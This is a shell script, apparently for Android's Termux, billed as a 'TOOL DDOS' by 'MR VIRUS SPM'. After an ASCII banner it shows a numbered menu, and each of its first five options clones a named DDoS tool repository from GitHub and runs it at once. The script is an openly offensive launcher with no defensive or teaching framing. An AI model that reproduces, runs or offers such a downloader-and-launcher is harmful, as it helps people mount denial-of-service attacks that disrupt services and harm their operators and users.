

clear
xdg-open https://youtube.com/channel/UCJcJ5ZARYowKSZzgPWSxpcQ
echo
echo -e " _____ ___   ___  _          ____  ____   ___  ____  "
echo -e "|_   _/ _ \ / _ \| |        |  _ \|  _ \ / _ \/ ___| "
echo -e "  | || | | | | | | |   _____| | | | | | | | | \___ \ "
echo -e "  | || |_| | |_| | |__|_____| |_| | |_| | |_| |___) |"
echo -e "  |_| \___/ \___/|_____|    |____/|____/ \___/|____/ "
echo
sleep 2
echo -e "# AUTHOR : MR VIRUS SPM"
echo -e "# SCRIPT : TOOL DDOS"
echo -e "====================================================="
echo
sleep 2
echo
echo -e "1). DDOS ATACK"
echo -e "2). DDOS HAMER"
echo -e "3). DDOS LUCITA"
echo -e "4). DDOS DROID"
echo -e "5). DDOS BLACKCYC"
echo -e "6). keluar"
echo
sleep 2
read -p "NOMOR ===> " sprin
if [ $sprin == "1" ]
then
clear
    cd $HOME
    pkg update && pkg upgrade -y
    pkg install python -y
    pkg install figlet -y
    pkg install git -y
    git clone https://github.com/MrVirusSpm-07/ddos-attack
    cd ddos-attack
    python attack-ddos.py
fi
if [ $sprin == "2" ]
then
clear
    cd $HOME
    pkg update -y
    pkg upgrade -y
    pkg install python -y
    pkg install git -y
    git clone https://github.com/cyweb/hammer
    cd hammer
   python hammer.py
fi
if [ $sprin == "3" ]
then
clear
    cd $HOME
    apt update && apt upgrade -y
    pkg install git -y
    pkg install python -y
    git clone https://github.com/zlucifer/lucita_ddos
    cd lucita_ddos
    python pukul.py
fi
if [ $sprin == "4" ]
then
clear
    cd $HOME
    apt update && apt upgrade -y
    apt install git toilet -y
    apt install python -y
    apt install python2 -y
    git clone https://github.com/banghyuu/ddosWD
    cd ddosWD
    sh Ddos.sh
fi
if [ $sprin == "5" ]
then
clear
    cd $HOME
    pkg update && pkg upgrade -y
    pkg install figlet -y
    pkg install git -y
    git clone https://github.com/BlackCyberAnonim/B-ATTACKING
    cd B-ATTACKING
    sh install.Sh
fi
if [ $sprin == "6" ]
then
clear
    exit 
fi
